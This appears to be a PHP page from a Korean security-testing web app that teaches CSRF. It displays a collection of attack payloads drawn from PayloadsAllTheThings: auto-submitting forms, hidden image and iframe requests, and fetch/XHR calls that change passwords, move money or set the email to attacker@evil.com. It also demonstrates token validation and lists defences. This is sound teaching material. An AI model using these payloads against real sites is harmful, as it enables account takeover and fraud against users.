<?php
/**
 * CSRF (Cross-Site Request Forgery) 테스트 페이지
 * PayloadsAllTheThings의 CSRF 페이로드를 기반으로 구성
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$error = '';
$test_type = $_POST['test_type'] ?? 'form';
$csrf_token = $_SESSION['csrf_token'] ?? '';

// CSRF 토큰 생성 (세션에 저장)
if (empty($csrf_token)) {
    $csrf_token = bin2hex(random_bytes(32));
    $_SESSION['csrf_token'] = $csrf_token;
}

// CSRF 페이로드 모음 (PayloadsAllTheThings 기반)
$payloads = [
    'html_form' => [
        '<form action="http://victim.com/change-password" method="POST">
<input type="hidden" name="password" value="hacked123">
<input type="submit" value="Click me!">
</form>',
        '<form action="http://victim.com/transfer" method="POST">
<input type="hidden" name="amount" value="1000">
<input type="hidden" name="to" value="attacker">
<input type="submit" value="Win $1000!">
</form>',
        '<form action="http://victim.com/delete-account" method="POST">
<input type="hidden" name="confirm" value="yes">
<input type="submit" value="Free Gift!">
</form>'
    ],
    'auto_submit' => [
        '<form id="csrf-form" action="http://victim.com/action" method="POST">
<input type="hidden" name="data" value="malicious">
</form>
<script>document.getElementById("csrf-form").submit();</script>',
        '<body onload="document.forms[0].submit()">
<form action="http://victim.com/action" method="POST">
<input type="hidden" name="action" value="delete">
</form>
</body>',
        '<iframe style="display:none" name="csrf-frame"></iframe>
<form target="csrf-frame" action="http://victim.com/action" method="POST">
<input type="hidden" name="malicious" value="payload">
</form>
<script>document.forms[0].submit();</script>'
    ],
    'get_csrf' => [
        '<img src="http://victim.com/delete?id=123" style="display:none">',
        '<link rel="prefetch" href="http://victim.com/action?delete=all">',
        '<script src="http://victim.com/api/delete?user=victim"></script>',
        '<iframe src="http://victim.com/admin/reset-password?user=admin&newpass=hacked"></iframe>'
    ],
    'ajax_csrf' => [
        '<script>
fetch("http://victim.com/api/transfer", {
    method: "POST",
    body: "amount=1000&to=attacker",
    headers: {"Content-Type": "application/x-www-form-urlencoded"}
});
</script>',
        '<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://victim.com/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=attacker@evil.com");
</script>',
        '<script>
$.post("http://victim.com/api/delete", {id: "all"});
</script>'
    ],
    'bypass_techniques' => [
        '<!-- Using different HTTP methods -->
<form action="http://victim.com/action" method="PUT">
<input type="hidden" name="_method" value="DELETE">
</form>',
        '<!-- Using JSON content type -->
<script>
fetch("/api/action", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({action: "delete", target: "all"})
});
</script>',
        '<!-- Using CORS preflight bypass -->
<form action="http://victim.com/api" method="POST" enctype="text/plain">
<input name=\'{"action":"delete","data":\' value=\'"malicious"}\'>
</form>'
    ]
];

// 테스트 실행
if ($_POST && isset($_POST['action'])) {
    $action = $_POST['action'];
    $submitted_token = $_POST['csrf_token'] ?? '';
    
    // CSRF 토큰 검증
    if (hash_equals($csrf_token, $submitted_token)) {
        switch ($action) {
            case 'change_password':
                $result = "✅ 비밀번호가 안전하게 변경되었습니다. CSRF 토큰이 올바르게 검증되었습니다.";
                break;
            case 'transfer_money':
                $result = "✅ 송금이 안전하게 처리되었습니다. CSRF 토큰이 올바르게 검증되었습니다.";
                break;
            case 'delete_account':
                $result = "✅ 계정 삭제가 안전하게 처리되었습니다. CSRF 토큰이 올바르게 검증되었습니다.";
                break;
            default:
                $result = "✅ 요청이 안전하게 처리되었습니다. CSRF 토큰 검증 성공.";
        }
    } else {
        $result = "⚠️ CSRF 공격이 차단되었습니다!\n\n";
        $result .= "제출된 토큰: " . htmlspecialchars($submitted_token) . "\n";
        $result .= "예상 토큰: " . htmlspecialchars($csrf_token) . "\n\n";
        $result .= "이 요청은 다음과 같은 이유로 거부되었습니다:\n";
        $result .= "- CSRF 토큰이 일치하지 않음\n";
        $result .= "- 악의적인 사이트에서 전송된 요청일 가능성\n";
        $result .= "- 사용자의 의도와 다른 요청일 가능성\n\n";
        $result .= "🛡️ CSRF 보호 메커니즘이 정상적으로 작동했습니다.";
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF 테스트 - 보안 테스트</title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .payload-section {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .payload-display {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        
        .test-form {
            background: white;
            border: 2px solid #dc3545;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .vulnerable-form {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .safe-form {
            background: #d4edda;
            border: 2px solid #28a745;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .result-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #155724;
            font-family: monospace;
            white-space: pre-wrap;
        }
        
        .danger-box {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #721c24;
        }
        
        .info-box {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #0c5460;
        }
        
        .demo-iframe {
            width: 100%;
            height: 300px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        
        .csrf-token {
            background: #e9ecef;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            word-break: break-all;
            margin: 10px 0;
        }
        
        .action-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 15px 0;
        }
        
        code {
            background: #f8f9fa;
            padding: 2px 4px;  
            border-radius: 3px;
            font-family: monospace;
        }
        
        .severity-critical {
            color: #721c24;
            font-weight: bold;
            background: #f8d7da;
            padding: 2px 4px;
            border-radius: 3px;
        }
    </style>  
</head>
<body>
    <div class="container">
        <!-- 네비게이션 -->
        <nav class="nav">
            <h1>CSRF (Cross-Site Request Forgery) 테스트</h1>
            <div class="nav-links">
                <a href="index.php" class="btn">보안 테스트 메인</a>
                <a href="../index.php" class="btn">홈</a>
            </div>
        </nav>

        <!-- 브레드크럼 -->
        <nav class="breadcrumb">
            <a href="../index.php">홈</a> &gt; 
            <a href="index.php">보안 테스트</a> &gt; 
            <span>CSRF 테스트</span>
        </nav>

        <!-- 설명 -->
        <div class="info-box">
            <h3>🔄 Cross-Site Request Forgery (CSRF) 테스트</h3>
            <p><strong>CSRF</strong>는 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹사이트에 요청하게 하는 공격입니다.</p>
            <p>사용자가 로그인된 상태에서 악의적인 링크를 클릭하거나 조작된 페이지를 방문할 때 발생합니다.</p>
            <p><strong>참고:</strong> 이 페이지에서는 CSRF 토큰을 사용한 안전한 환경에서 테스트합니다.</p>
        </div>

        <!-- 경고 -->
        <div class="danger-box">
            <h3>⚠️ <span class="severity-critical">HIGH RISK</span> 보안 위험</h3>
            <p>CSRF 취약점은 다음과 같은 심각한 결과를 초래할 수 있습니다:</p>
            <ul>
                <li>비밀번호 변경 및 계정 정보 수정</li>
                <li>금융 거래 및 송금 실행</li>
                <li>이메일 주소 변경으로 인한 계정 탈취</li>
                <li>중요한 데이터 삭제 또는 수정</li>
                <li>관리자 권한으로 시스템 설정 변경</li>
            </ul>
        </div>

        <!-- 현재 CSRF 토큰 -->
        <div class="csrf-token">
            <strong>현재 세션 CSRF 토큰:</strong><br>
            <?php echo htmlspecialchars($csrf_token); ?>
        </div>

        <!-- HTML Form CSRF -->
        <div class="payload-section">
            <h3>📝 HTML Form Based CSRF</h3>
            <p>일반적인 HTML 폼을 사용한 CSRF 공격입니다. 사용자가 버튼을 클릭하도록 유도합니다.</p>
            <?php foreach ($payloads['html_form'] as $index => $payload): ?>
                <div class="payload-display"><?php echo htmlspecialchars($payload); ?></div>
            <?php endforeach; ?>
        </div>

        <!-- Auto Submit CSRF -->
        <div class="payload-section">
            <h3>🤖 Auto Submit CSRF</h3>
            <p>JavaScript를 사용하여 페이지 로드 시 자동으로 폼을 제출하는 CSRF 공격입니다.</p>
            <?php foreach ($payloads['auto_submit'] as $index => $payload): ?>
                <div class="payload-display"><?php echo htmlspecialchars($payload); ?></div>
            <?php endforeach; ?>
        </div>

        <!-- GET Based CSRF -->
        <div class="payload-section">
            <h3>🔗 GET Based CSRF</h3>
            <p>GET 요청을 이용한 CSRF 공격입니다. 이미지나 링크를 통해 실행됩니다.</p>
            <?php foreach ($payloads['get_csrf'] as $index => $payload): ?>
                <div class="payload-display"><?php echo htmlspecialchars($payload); ?></div>
            <?php endforeach; ?>
        </div>

        <!-- AJAX CSRF -->
        <div class="payload-section">
            <h3>📡 AJAX Based CSRF</h3>
            <p>JavaScript의 AJAX를 사용한 CSRF 공격입니다. 더 정교한 공격이 가능합니다.</p>
            <?php foreach ($payloads['ajax_csrf'] as $index => $payload): ?>
                <div class="payload-display"><?php echo htmlspecialchars($payload); ?></div>
            <?php endforeach; ?>
        </div>

        <!-- Bypass Techniques -->
        <div class="payload-section">
            <h3>🚫 CSRF Protection Bypass</h3>
            <p>CSRF 보호 메커니즘을 우회하려는 고급 기법들입니다.</p>
            <?php foreach ($payloads['bypass_techniques'] as $index => $payload): ?>
                <div class="payload-display"><?php echo htmlspecialchars($payload); ?></div>
            <?php endforeach; ?>
        </div>

        <!-- 취약한 폼 시뮬레이션 -->
        <div class="vulnerable-form">
            <h3>⚠️ 취약한 폼 시뮬레이션 (CSRF 토큰 없음)</h3>
            <p>이 폼은 CSRF 토큰이 없어서 취약합니다. 실제로는 차단됩니다.</p>
            <form method="post">
                <label>작업 선택:</label><br>
                <div class="action-buttons">
                    <button type="submit" name="action" value="change_password" class="btn" style="background: #dc3545;">비밀번호 변경</button>
                    <button type="submit" name="action" value="transfer_money" class="btn" style="background: #dc3545;">송금 실행</button>
                    <button type="submit" name="action" value="delete_account" class="btn" style="background: #dc3545;">계정 삭제</button>
                </div>
                <small>⚠️ CSRF 토큰이 없어서 모든 요청이 차단됩니다.</small>
            </form>
        </div>

        <!-- 안전한 폼 -->
        <div class="safe-form">
            <h3>✅ 안전한 폼 (CSRF 토큰 보호)</h3>
            <p>이 폼은 CSRF 토큰으로 보호되어 안전합니다.</p>
            <form method="post">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
                <label>작업 선택:</label><br>
                <div class="action-buttons">
                    <button type="submit" name="action" value="change_password" class="btn" style="background: #28a745;">비밀번호 변경</button>
                    <button type="submit" name="action" value="transfer_money" class="btn" style="background: #28a745;">송금 실행</button>
                    <button type="submit" name="action" value="delete_account" class="btn" style="background: #28a745;">계정 삭제</button>
                </div>
                <small>✅ CSRF 토큰으로 보호되어 안전합니다.</small>
            </form>
        </div>

        <!-- 결과 표시 -->
        <?php if ($result): ?>
            <div class="result-box">
                <h3>📊 테스트 결과</h3>
                <?php echo $result; ?>
            </div>
        <?php endif; ?>

        <!-- CSRF 공격 시나리오 -->
        <div class="info-box">
            <h3>💡 CSRF 공격 시나리오</h3>
            <p><strong>시나리오 1:</strong> 이메일 속 악의적인 링크</p>
            <code>&lt;img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none"&gt;</code>
            <br><br>
            <p><strong>시나리오 2:</strong> 소셜 미디어의 조작된 링크</p>
            <code>&lt;a href="http://admin.com/delete-user?id=123"&gt;Funny Video!&lt;/a&gt;</code>
            <br><br>
            <p><strong>시나리오 3:</strong> 악의적인 웹사이트 방문</p>
            <code>자동으로 폼을 제출하여 사용자 모르게 요청 전송</code>
        </div>

        <!-- 방어 방법 -->
        <div class="info-box">
            <h3>🛡️ CSRF 방어 방법</h3>
            <ul>
                <li><strong>CSRF 토큰:</strong> 각 폼에 고유하고 예측 불가능한 토큰 포함</li>
                <li><strong>SameSite 쿠키:</strong> 쿠키의 SameSite 속성을 Strict 또는 Lax로 설정</li>
                <li><strong>Referer 헤더 검증:</strong> 요청의 출처를 확인</li>
                <li><strong>Origin 헤더 검증:</strong> 요청이 같은 도메인에서 왔는지 확인</li>
                <li><strong>Double Submit Cookie:</strong> 쿠키와 파라미터에 같은 값 포함</li>
                <li><strong>Custom 헤더:</strong> Ajax 요청에 커스텀 헤더 추가</li>
                <li><strong>재인증 요구:</strong> 중요한 작업 시 비밀번호 재입력 요구</li>
            </ul>
        </div>

        <!-- 토큰 생성 예제 -->
        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>🔧 CSRF 토큰 구현 예제</h3>
            <h4>PHP 예제:</h4>
            <div class="payload-display">// 토큰 생성
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

// 토큰 검증
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token mismatch');
}</div>

            <h4>JavaScript 예제:</h4>
            <div class="payload-display">// 메타 태그에서 토큰 읽기
const token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

// AJAX 요청에 토큰 포함
fetch('/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': token
    },
    body: JSON.stringify(data)
});</div>
        </div>

        <!-- 참고 자료 -->
        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>📚 참고 자료</h3>
            <ul>
                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection" target="_blank">PayloadsAllTheThings - CSRF Injection</a></li>
                <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP - Cross-Site Request Forgery</a></li>
                <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger - CSRF</a></li>
                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite" target="_blank">MDN - SameSite cookies</a></li>
            </ul>
        </div>
    </div>

    <script>
        // 폼 제출 시 확인
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function(e) {
                const hasToken = this.querySelector('input[name="csrf_token"]');
                
                if (!hasToken) {
                    const confirmed = confirm(
                        '⚠️ 이 폼은 CSRF 토큰이 없어서 취약합니다.\n' +
                        'CSRF 공격 시뮬레이션을 위해 계속하시겠습니까?\n\n' +
                        '실제로는 이 요청이 차단됩니다.'
                    );
                    
                    if (!confirmed) {
                        e.preventDefault();
                    }
                } else {
                    const confirmed = confirm(
                        '✅ 이 폼은 CSRF 토큰으로 보호됩니다.\n' +
                        '안전한 요청을 전송하시겠습니까?'
                    );
                    
                    if (!confirmed) {
                        e.preventDefault();
                    }
                }
            });
        });

        // 토큰 새로고침 기능
        function refreshToken() {
            window.location.reload();
        }

        // 토큰 복사 기능
        function copyToken() {
            const token = '<?php echo $csrf_token; ?>';
            navigator.clipboard.writeText(token).then(() => {
                alert('CSRF 토큰이 클립보드에 복사되었습니다.');
            });
        }
    </script>
</body>
</html>